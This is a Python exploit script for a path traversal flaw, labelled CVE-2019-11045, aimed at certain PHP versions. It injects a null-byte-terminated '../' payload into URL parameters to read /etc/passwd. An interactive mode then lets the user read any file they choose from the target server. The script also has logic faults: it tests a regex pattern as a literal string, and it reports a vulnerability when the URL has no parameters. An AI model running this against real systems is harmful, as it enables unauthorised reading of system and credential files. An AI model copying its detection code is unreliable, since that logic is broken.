# Path Traversal

# ^7\.2\.(?:[0-9]|1[0-9]|2[0-5])$|^7\.3\.(?:[0-9]|1[0-2])$|^7\.4\.0$

import requests
import sys
import subprocess
import argparse
import time
import socket 
import select  
import threading  
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


def vulnerable_check(url, parameters):
    payload = "/../../../../../../../../../etc/passwd\x00"
    
    for param in parameters:
        try:
            parameters[param] = [payload]
            new_parameters = urlencode(parameters, doseq=True)
            new_url = urlunparse((
                url.scheme,
                url.netloc,
                url.path,
                url.params,
                new_parameters,
                url.fragment
            ))
            curl_cmd = ['curl', new_url, '-sk']
            output = subprocess.run(curl_cmd, capture_output=True, text=True, check=False)
            if output.returncode != 0:
                print("[!] Error in subprocess command:", output.stderr)
                break
            
            if "root:.*:0:0:" in output.stdout:
                print("[+] Detected Vulnerability : True\n")
                return param           
            
        except Exception as e:
            print(f"[!] Error occured in vulnerable checking: {e}")
            continue
    
    print("[-] Detected Vulnerability : False\n")
    return False

def check_param(result, parameters):
    if result == False:
        return False
    
    print("[+] Extracting vulnerable parameter")
    for param in parameters.keys():
        try:
            if param == result:
                print("[+] Found vulnerable parameter")
                return param
        except Exception as e:
            print("[!] Error occured in extracting vulnerable parameter")
            continue
    return False
   
parser = argparse.ArgumentParser(usage="""CVE-2019-11045.py -u https://*.*.*.*/index.php?file=test.txt -m""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--mode', '-m', help='Exploit mode', action='store_true')
args = parser.parse_args()

#Parsing URL as protocol, host, path
parsed_url = urlparse(args.URL) 
path = parsed_url.path       
parameters = parse_qs(parsed_url.query)

if not path or not parameters:
    print("[+] Detected Vulnerability : True\n")
    print("Check your url whether there are path and parameters")
    sys.exit()


try:
    check_result = check_param(vulnerable_check(parsed_url, parameters), parameters)


    if args.mode and check_result:
        while True:
            print("-" * 150)
            user_input = input("[*] Put directory you want ex) /etc/passwd (or type 'exit' to quit): ").strip()
            if user_input.lower() == "exit":
                break

            # Validate user input
            if not user_input.startswith("/"):
                print("[!] Invalid input. Please start with '/'.")
                continue

            payload = "/../../../../../../../.." + user_input + "\x00"
            
            try:
                parameters[check_result] = [payload]
                new_parameters = urlencode(parameters, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_parameters,
                    parsed_url.fragment
                ))
                
                curl_cmd = ['curl', new_url, '-sk']
                output = subprocess.run(curl_cmd, capture_output=True, text=True, check=False)
                if output.returncode != 0:
                    print("[!] Error in subprocess command:", output.stderr.strip())
                    continue

                print(output.stdout.strip())
            except Exception as e:
                print(f"[!] Error occurred in sending user's payload: {e}")
                continue
except KeyboardInterrupt:
    print("\n[!] Exiting on user interruption.")
    sys.exit(0)
except Exception as e:
    print(f"[!] Unexpected error: {e}")
    sys.exit(1)